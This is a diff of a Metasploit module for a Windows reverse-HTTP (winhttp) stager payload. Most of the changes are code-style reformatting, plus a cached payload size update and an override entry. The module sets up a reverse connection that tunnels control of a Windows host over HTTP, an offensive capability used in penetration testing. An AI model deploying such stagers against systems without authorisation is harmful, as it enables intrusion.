@@ -4,26 +4,30 @@
 ##
 
 module MetasploitModule
-
-  CachedSize = 533
+  CachedSize = 534
+  CachedSizeOverrides = {"windows/custom/reverse_winhttp" => 548}
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows
   include Msf::Payload::Windows::ReverseWinHttp
 
   def self.handler_type_alias
-    "reverse_winhttp"
+    'reverse_winhttp'
   end
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'        => 'Windows Reverse HTTP Stager (winhttp)',
-      'Description' => 'Tunnel communication over HTTP (Windows winhttp)',
-      'Author'      => [ 'hdm', 'Borja Merino <bmerinofe[at]gmail.com>' ],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'win',
-      'Arch'        => ARCH_X86,
-      'Handler'     => Msf::Handler::ReverseHttp,
-      'Convention'  => 'sockedi http'))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows Reverse HTTP Stager (winhttp)',
+        'Description' => 'Tunnel communication over HTTP (Windows winhttp)',
+        'Author' => [ 'hdm', 'Borja Merino <bmerinofe[at]gmail.com>' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X86,
+        'Handler' => Msf::Handler::ReverseHttp,
+        'Convention' => 'sockedi http'
+      )
+    )
   end
 end
